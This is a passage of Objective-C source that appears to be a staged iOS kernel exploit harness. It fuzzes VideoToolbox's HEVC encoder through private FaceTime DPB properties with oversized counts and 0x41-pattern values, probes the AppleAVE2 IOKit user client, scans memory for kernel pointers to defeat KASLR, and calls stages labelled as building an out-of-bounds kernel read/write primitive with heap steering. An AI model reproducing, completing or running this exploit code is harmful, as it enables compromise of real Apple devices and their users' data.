        NSString *s3 = KPH9RunTimed(@"Stage3-DPB", 15000, &vtHung, ^(NSMutableString *out) {
            NSMutableArray *cbSink = [NSMutableArray array];
            CFTypeRef retainedSink = CFRetain((__bridge CFTypeRef)cbSink);
            NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
            VTCompressionSessionRef s = NULL;
            OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                     kCMVideoCodecType_HEVC,
                                                     (__bridge CFDictionaryRef)spec,
                                                     NULL, NULL, KPH9AttsCB,
                                                     (void *)retainedSink, &s);
            if (st != noErr || !s) {
                KPH9OutAppend(out, @"  session create -> %d\n", (int)st);
                CFRelease(retainedSink);
                return;
            }
            VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
            VTSessionSetProperty(s, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
            KPH9PrimeRealTime(s);
            VTCompressionSessionPrepareToEncodeFrames(s);

            CVPixelBufferRef pb = KPH9CreatePixelBuffer(1280, 720);
            int64_t pts = 0;
            if (pb) {
                @synchronized (cbSink) { [cbSink removeAllObjects]; }
                // Prime IDR (pts=0) + 6 B/P frames (pts=1..6) so the 2-frame lookahead queue is
                // completely full and the very first 2-frame probe (dpb[num0 x1]) pops 2 callbacks immediately.
                for (int warm = 0; warm < 7; warm++) {
                    VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
                }
                KPH9Drain(cbSink, 5, 160);
            }

            // Analyst strike 2/3: full 17..32 matrix + exact cutoff 32..64,
            // each row tested on TWO P-frames (DPB matching bites beyond IDR).
            int counts[] = { 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28,
                             29, 30, 31, 32, 33, 34, 48, 63, 64 };
            int nCounts = (int)(sizeof(counts) / sizeof(counts[0]));
            for (int ci = 0; ci < nCounts; ci++) {
                int n = counts[ci];
                NSMutableArray *arr = [NSMutableArray arrayWithCapacity:(NSUInteger)n];
                for (int k = 0; k < n; k++) [arr addObject:@(k)];
                OSStatus sp = VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
                OSStatus fe = -1, fe2 = -1;
                if (pb) {
                    @synchronized (cbSink) { [cbSink removeAllObjects]; }
                    NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
                    fe = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                         (__bridge CFDictionaryRef)fp, NULL, NULL);
                    fe2 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                          (__bridge CFDictionaryRef)fp, NULL, NULL);
                    if (fe == noErr || fe2 == noErr) KPH9Drain(cbSink, 2, 80);
                }
                NSString *cb = nil;
                @synchronized (cbSink) {
                    cb = cbSink.count ? [cbSink componentsJoinedByString:@" | "] : @"(no cb)";
                }
                KPH9OutAppend(out, @"  dpb[num0 x%-2d] set=%d enc=%d/%d cb=%@\n", n, (int)sp, (int)fe, (int)fe2, cb);
            }

            long long vals[] = { 15, 16, 32, -1, 0x4141414141414141LL };
            for (int vi = 0; vi < 5; vi++) {
                NSMutableArray *arr = [NSMutableArray arrayWithCapacity:16];
                for (int k = 0; k < 16; k++) [arr addObject:@(vals[vi])];
                OSStatus sp = VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
                OSStatus fe = -1, fe2 = -1;
                if (pb) {
                    @synchronized (cbSink) { [cbSink removeAllObjects]; }
                    NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
                    fe = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                         (__bridge CFDictionaryRef)fp, NULL, NULL);
                    fe2 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                          (__bridge CFDictionaryRef)fp, NULL, NULL);
                    if (fe == noErr || fe2 == noErr) KPH9Drain(cbSink, 2, 80);
                }
                NSString *cb = nil;
                @synchronized (cbSink) {
                    cb = cbSink.count ? [cbSink componentsJoinedByString:@" | "] : @"(no cb)";
                }
                KPH9OutAppend(out, @"  dpb[val=0x%llx x16] set=%d enc=%d/%d cb=%@\n", vals[vi], (int)sp, (int)fe, (int)fe2, cb);
            }

            if (pb) CVPixelBufferRelease(pb);
            KPH9SafeTeardownEx(s, retainedSink, NULL);
        });
        [report appendString:s3];
    }

    // -------------------------------------------------------------------------
    // Stage 4: Direct AppleAVE2 IOKit UserClient Check
    // -------------------------------------------------------------------------
    [self journal:@"Stage 4: Direct AppleAVE2 IOKit probe"];
    [report appendString:@"\n--- Stage 4: Direct AppleAVE2 IOKit Probe ---\n"];
    kp_io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching("AppleAVE2"));
    [report appendFormat:@"  AppleAVE2 service=%u\n", svc];
    if (svc) {
        kp_io_connect_t conn = 0;
        kern_return_t ok = IOServiceOpen(svc, (unsigned int)mach_task_self(), 0, &conn);
        [report appendFormat:@"  IOServiceOpen -> 0x%x (conn=%u)\n", ok, conn];
        if (ok == KERN_SUCCESS && conn) {
            IOServiceClose(conn);
        }
        IOObjectRelease(svc);
    } else {
        [report appendString:@"  AppleAVE2 not exposed to sandbox\n"];
    }

    // -------------------------------------------------------------------------
    // Stage 5: Safe VM / KASLR Candidate Scan (vm_read_overwrite + Region/Context Dump)
    // -------------------------------------------------------------------------
    [self journal:@"Stage 5: Safe VM candidate scan"];
    [report appendString:@"\n--- Stage 5: Safe VM / KASLR Candidate Scan ---\n"];
    vm_address_t addr = 0;
    vm_size_t size = 0;
    uint32_t depth = 0;
    vm_region_submap_info_data_64_t info;
    mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
    uint64_t pageBuf[512];
    Stage5KPtrRecord localCands[16];
    memset(localCands, 0, sizeof(localCands));
    vm_address_t exclAddrs[3] = {
        (vm_address_t)pageBuf,
        (vm_address_t)localCands,
        (vm_address_t)gStage5Cands
    };
    vm_size_t exclSizes[3] = {
        sizeof(pageBuf),
        sizeof(localCands),
        sizeof(gStage5Cands)
    };
    memset(gStage5Cands, 0, sizeof(gStage5Cands));
    gStage5CandCount = 0;
    int candidates = 0;
    int sampleCount = 0;
    for (int iter = 0; iter < 4096 && candidates < 64; iter++) {
        count = VM_REGION_SUBMAP_INFO_COUNT_64;
        if (vm_region_recurse_64(mach_task_self(), &addr, &size, &depth,
                                 (vm_region_recurse_info_t)&info, &count) != KERN_SUCCESS || size == 0) {
            break;
        }
        if (info.is_submap) {
            depth++;
            continue;
        }
        if ((info.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
            size <= 16 * 1024 * 1024 &&
            !KPVMShouldSkipRegion(&info, addr, size, &depth, exclAddrs, exclSizes, 3)) {
            for (vm_size_t off = 0; off + sizeof(pageBuf) <= size && candidates < 64; off += sizeof(pageBuf)) {
                vm_size_t outSz = 0;
                if (vm_read_overwrite(mach_task_self(), addr + off, sizeof(pageBuf),
                                      (vm_address_t)pageBuf, &outSz) != KERN_SUCCESS ||
                    outSz < sizeof(uint64_t)) {
                    break;
                }
                size_t words = outSz / sizeof(uint64_t);
                for (size_t w = 0; w < words && candidates < 64; w++) {
                    uint64_t v = pageBuf[w];
                    if (KPIsContextFalsePositive(pageBuf, words, w)) continue;
                    if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
                        if (sampleCount < 16) {
                            Stage5KPtrRecord *rec = &localCands[sampleCount++];
                            rec->kptr = v;
                            rec->userVA = addr + off + (vm_size_t)(w * sizeof(uint64_t));
                            rec->regionBase = addr;
                            rec->regionSize = size;
                            rec->userTag = info.user_tag;
                            rec->shareMode = info.share_mode;
                            rec->objectId = info.object_id;
                            int32_t hiSigned = (int32_t)(uint32_t)(v >> 32);
                            rec->steeredNTL = 16463 + hiSigned;
                            rec->steeredX0 = ((v & 0xffffffff00000000ULL) | 0x59ULL);
                            for (int cw = 0; cw < 8; cw++) {
                                ptrdiff_t idx = (ptrdiff_t)w - 2 + cw;
                                rec->ctxWords[cw] = (idx >= 0 && (size_t)idx < words) ? pageBuf[idx] : 0;
                            }
                        }
                        candidates++;
                    }
                }
            }
        }
        if (addr + size <= addr) break;
        addr += size;
    }
    memcpy(gStage5Cands, localCands, sizeof(localCands));
    gStage5CandCount = sampleCount;
    [report appendFormat:@"  filtered kernel pointer candidates: %d\n", candidates];
    for (int si = 0; si < sampleCount; si++) {
        const Stage5KPtrRecord *rec = &gStage5Cands[si];
        kptr_class_t cls = KPClassifyKPtr(rec->kptr);
        const char *clsStr = (cls == KPTR_CANDIDATE_KERNEL_TEXT_DATA) ? "KERNEL_TEXT_DATA" : "ZONE_HEAP";
        [report appendFormat:@"    cand[%d] = 0x%016llx [%s] @ va=0x%lx (reg=0x%lx+0x%zx tag=%u share=%u obj=0x%x) -> steeredNTL=%d (x0=0x%016llx)\n",
         si, rec->kptr, clsStr, (unsigned long)rec->userVA,
         (unsigned long)rec->regionBase, (size_t)rec->regionSize,
         rec->userTag, (unsigned)rec->shareMode, rec->objectId,
         rec->steeredNTL, rec->steeredX0];
        [report appendFormat:@"      ctx[-2..+5]: %016llx %016llx [%016llx] %016llx %016llx %016llx %016llx %016llx\n",
         rec->ctxWords[0], rec->ctxWords[1], rec->ctxWords[2], rec->ctxWords[3],
         rec->ctxWords[4], rec->ctxWords[5], rec->ctxWords[6], rec->ctxWords[7]];
    }

    // -------------------------------------------------------------------------
    // Stage 6: XPC bitstream / NAL / attachments leak + exact DPB boundary
    // -------------------------------------------------------------------------
    [self journal:@"Stage 6: XPC bitstream leak & DPB boundary"];
    if (vtHung) {
        [report appendString:@"\n--- Stage 6 skipped (videocodecd XPC unresponsive) ---\n"];
    } else {
        NSString *s6 = KPH9RunTimed(@"Stage6-XPC", 15000, &vtHung, ^(NSMutableString *out) {
            RunStage6_XPCLeakAndBoundaryAudit(out);
        });
        [report appendString:s6];
    }

    // -------------------------------------------------------------------------
    // Stage 7: -17691 malfunction matrix + UserRPS container ladder
    // -------------------------------------------------------------------------
    [self journal:@"Stage 7: -17691 matrix + UserRPS containers"];
    if (vtHung) {
        [report appendString:@"\n--- Stage 7 skipped (videocodecd XPC unresponsive) ---\n"];
    } else {
        NSString *s7 = KPH9RunTimed(@"Stage7-Matrix", 25000, &vtHung, ^(NSMutableString *out) {
            RunStage7_MalfunctionMatrix(out);
        });
        [report appendString:s7];
    }

    // -------------------------------------------------------------------------
    // Stage 8: KRW Synthesis — Multi-PPS OOB R/W, DPB/RPS Alias Bridge & Dynamic NTL Heap Steering
    // -------------------------------------------------------------------------
    [self journal:@"Stage 8: KRW synthesis & R/W bridge"];
    if (vtHung) {
        [report appendString:@"\n--- Stage 8 skipped (videocodecd XPC unresponsive) ---\n"];
    } else {
        NSString *s8 = KPH9RunTimed(@"Stage8-KRW", 12000, &vtHung, ^(NSMutableString *out) {
            RunStage8_KRWPrimitiveAndReadWriteBridge(out);
        });
        [report appendString:s8];
    }

    [report appendFormat:@"\nVERDICT: %@\n", vtHung ? @"VIDEOCODECD_XPC_TIMEOUT (reboot device to clear wedged daemon)" : @"COMPLETED_CLEAN"];

    [self journal:@"=== H9 clean rebuild complete ==="];
    return report;
}

@end
